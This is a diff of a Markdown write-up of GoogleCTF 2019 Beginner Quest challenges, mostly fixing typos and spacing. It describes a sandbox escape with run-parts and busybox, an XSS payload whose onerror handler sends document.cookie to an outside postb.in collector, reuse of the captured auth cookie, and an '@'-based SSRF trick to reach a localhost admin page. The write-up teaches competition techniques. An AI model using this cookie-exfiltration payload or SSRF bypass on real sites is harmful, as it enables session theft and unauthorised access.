@@ -1,7 +1,8 @@
 # GoogleCTF
 ## 2019 - Beginner Quest (Part 3)
-[lint to Part 1](./GoogleCTF_Beginner_Quest.html)
-[lint to Part 2](./GoogleCTF_Beginner_Quest_2.html)
+[link to Part 1](./GoogleCTF_Beginner_Quest.html)
+
+[link to Part 2](./GoogleCTF_Beginner_Quest_2.html)
 
 ### Day 3 - Work Computer (sandbox)
 #### Steps
@@ -17,10 +18,10 @@
     ```
 1. Again, we have to enumerate to find all commands in `/bin`. After searching and reference from other [write-ups](https://github.com/AidanFray/CTF_Writeups/tree/master/2019/GoogleCTF/BeginnerQuests/WorkComputer), we can find the useful command `run-parts`.
     1. Firstly we install the environment in tmp, making the directory having only one command.
-        > install /bin/busybox /tmp
+        > $ install /bin/busybox /tmp
     1. Then we can test it through the `run-parts` command:
         ```console
-        > run-parts /tmp
+        > $ run-parts /tmp
         BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.
         BusyBox is copyrighted by many authors between 1998-2015.
         Licensed under GPLv2. See source distribution for detailed
@@ -44,6 +45,7 @@
     ![Webpage](./images/GoogleCTF/beginner_quest/img11.png) 
 1. But the blind spot is that HTML is still valid and javascript in `onerror` is not checked. Therefore we can use the same XSS trick as Part 1 with our postb.in friend. Then there is our flag!
     > &lt; img src="x" onerror="document.location='https://postb.in/1564843387388-4921431124676/?'+document.cookie"&gt;
+
     ![Flag](./images/GoogleCTF/beginner_quest/img12.png) 
 
 
@@ -54,6 +56,7 @@
     > auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
 1. Remember the previous XSS flag, where there is a '/admin' directory? yes, there is an admin directory here too. Only that it redirects us back to the website unless we give the `auth` cookie.
     > document.cookie = "auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"
+
     ![Admin site](./images/GoogleCTF/beginner_quest/img13.png) 
 1. Well there is not much to see, and the 'Camera Control' tab is not working too.
     > Requests only accepted from 127.0.0.1
@@ -61,4 +64,5 @@
     > /watch?livestream=http://cwo-xss.web.ctfcompetition.com/livestream/garden-livestream.webm
 1. However, trying to replace the path solely is not enough as it is not recongized also as a local file request. We have to fake the server by putting a additional '@' sign to trick it. After that our flag appears!
     > http://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@localhost/admin/controls
+
     ![Flag](./images/GoogleCTF/beginner_quest/img14.png) 
